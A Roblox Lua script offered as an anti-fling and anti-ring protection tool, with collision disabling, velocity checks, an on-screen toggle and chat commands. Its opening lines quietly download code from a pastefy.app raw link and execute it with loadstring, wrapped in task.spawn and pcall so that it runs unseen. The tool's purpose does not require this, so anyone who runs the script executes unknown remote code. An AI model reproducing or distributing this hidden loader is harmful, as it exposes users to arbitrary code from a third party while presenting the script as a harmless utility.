task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/LWgBvOhb/raw"))()
    end)
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")

local localPlayer = Players.LocalPlayer
local connections = {}
local isEnabled = true

local DetectionRadius = 25
local MaxSafeVelocity = 80

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiFlingIndicator"
screenGui.ResetOnSpawn = false

local uiParent = pcall(function() return CoreGui.RobloxGui end) and CoreGui or localPlayer:WaitForChild("PlayerGui")
screenGui.Parent = uiParent

local statusLabel = Instance.new("TextButton")
statusLabel.Name = "StatusButton"
statusLabel.Size = UDim2.new(0, 200, 0, 30)
statusLabel.Position = UDim2.new(0, 15, 1, -45)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Anti-Fling & Ring: Enabled"
statusLabel.TextColor3 = Color3.fromRGB(0, 255, 140)
statusLabel.TextSize = 16
statusLabel.Font = Enum.Font.SourceSansBold
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = screenGui

local uiStroke = Instance.new("UIStroke")
uiStroke.Thickness = 1.5
uiStroke.Color = Color3.fromRGB(0, 0, 0)
uiStroke.Transparency = 0.3
uiStroke.Parent = statusLabel

local function updateUI()
	if isEnabled then
		statusLabel.Text = "Anti-Fling & Ring: Enabled"
		statusLabel.TextColor3 = Color3.fromRGB(0, 255, 140)
	else
		statusLabel.Text = "Anti-Fling & Ring: Disabled"
		statusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
	end
end

local function setupCharacterCollision(character)
	local function disableCollide(part)
		if isEnabled and part:IsA("BasePart") then
			part.CanCollide = false
		end
	end

	for _, part in ipairs(character:GetChildren()) do
		disableCollide(part)
	end

	local childAddedConn = character.ChildAdded:Connect(disableCollide)

	local steppedConn = RunService.Stepped:Connect(function()
		if isEnabled and character:IsDescendantOf(Workspace) then
			for _, part in ipairs(character:GetChildren()) do
				if part:IsA("BasePart") and part.CanCollide then
					part.CanCollide = false
				end
			end
		end
	end)

	character.Destroying:Connect(function()
		childAddedConn:Disconnect()
		steppedConn:Disconnect()
	end)
end

local function trackPlayer(player)
	if player == localPlayer then return end
	local charAddedConn = player.CharacterAdded:Connect(setupCharacterCollision)
	if player.Character then
		setupCharacterCollision(player.Character)
	end
	connections[player] = charAddedConn
end

local function untrackPlayer(player)
	if connections[player] then
		connections[player]:Disconnect()
		connections[player] = nil
	end
end

for _, player in ipairs(Players:GetPlayers()) do
	trackPlayer(player)
end

Players.PlayerAdded:Connect(trackPlayer)
Players.PlayerRemoving:Connect(untrackPlayer)

local function SecurePart(part, hrpPosition, myChar)
	if not part:IsA("BasePart") or part.Anchored or part:IsDescendantOf(myChar) then
		return
	end

	local distance = (part.Position - hrpPosition).Magnitude
	if distance <= DetectionRadius then
		local vel = part.AssemblyLinearVelocity.Magnitude
		local rotVel = part.AssemblyAngularVelocity.Magnitude

		if vel > MaxSafeVelocity or rotVel > MaxSafeVelocity then
			part.CanCollide = false
			part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
			part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
			pcall(function()
				part.CFrame = part.CFrame + Vector3.new(0, 500, 0)
			end)
		end
	end
end

RunService.Heartbeat:Connect(function()
	if not isEnabled then return end

	local myChar = localPlayer.Character
	if not myChar then return end

	local hrp = myChar:FindFirstChild("HumanoidRootPart")
	if not hrp then return end

	local hrpPos = hrp.Position

	for _, item in ipairs(Workspace:GetChildren()) do
		if item:IsA("BasePart") then
			SecurePart(item, hrpPos, myChar)
		elseif item:IsA("Model") and not Players:GetPlayerFromCharacter(item) then
			for _, part in ipairs(item:GetDescendants()) do
				if part:IsA("BasePart") then
					SecurePart(part, hrpPos, myChar)
				end
			end
		end
	end
end)

statusLabel.MouseButton1Click:Connect(function()
	isEnabled = not isEnabled
	updateUI()
end)

localPlayer.Chatted:Connect(function(msg)
	msg = msg:lower()
	if msg == ";af on" or msg == ";antifling on" then
		isEnabled = true
	elseif msg == ";af off" or msg == ";antifling off" then
		isEnabled = false
	end
	updateUI()
end)
